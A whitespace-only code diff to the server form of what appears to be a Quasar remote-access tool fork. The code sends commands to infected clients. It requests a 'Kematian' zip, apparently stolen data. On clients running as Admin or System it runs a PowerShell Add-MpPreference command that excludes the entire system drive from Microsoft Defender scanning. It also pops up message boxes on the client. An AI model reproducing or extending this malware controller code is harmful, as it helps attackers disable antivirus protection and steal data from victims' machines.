@@ -476,20 +476,20 @@ namespace Quasar.Server.Forms
                         new KematianHandler(client).RequestKematianZip();
                         break;
                     case "Exclude System Drives":
-                        string powershellCode = "Add-MpPreference -ExclusionPath \"$([System.Environment]::GetEnvironmentVariable('SystemDrive'))\\\"\r\n";
+                    string powershellCode = "Add-MpPreference -ExclusionPath \"$([System.Environment]::GetEnvironmentVariable('SystemDrive'))\\\"\r\n";
                         if (client.Value.AccountType == "Admin" || client.Value.AccountType == "System")
                         {
                             client.Send(new DoSendQuickCommand { Command = powershellCode, Host = "powershell.exe" });
                         }
                         break;
                     case "Message Box":
-                        client.Send(new DoShowMessageBox
-                        {
-                            Caption = subItem0,
-                            Text = subItem1,
-                            Button = "OK",
-                            Icon = "None"
-                        });
+                    client.Send(new DoShowMessageBox
+                    {
+                        Caption = subItem0,
+                        Text = subItem1,
+                        Button = "OK",
+                        Icon = "None"
+                    });
                         break;
                 }
             }
